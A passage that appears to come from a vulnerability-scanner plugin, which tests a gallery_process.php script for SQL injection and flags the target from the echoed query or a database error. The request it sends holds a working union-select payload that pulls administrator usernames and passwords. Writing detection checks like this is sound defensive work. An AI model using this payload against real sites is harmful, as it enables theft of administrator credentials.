...
url = dir + "/gallery_process.php?edit=yes&pID=0%20union%20select%20user_name%20as%20title" + ",%20user_password%20as%20description%20from%20administrators%20&cID=0";
req = http_get( item: url, port: port );
buf = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(!buf){
	exit( 0 );
}
if(egrep( pattern: ".*union select.*", string: buf ) || egrep( pattern: ".*Table.*administrators.*doesn't exist.*", string: buf )){
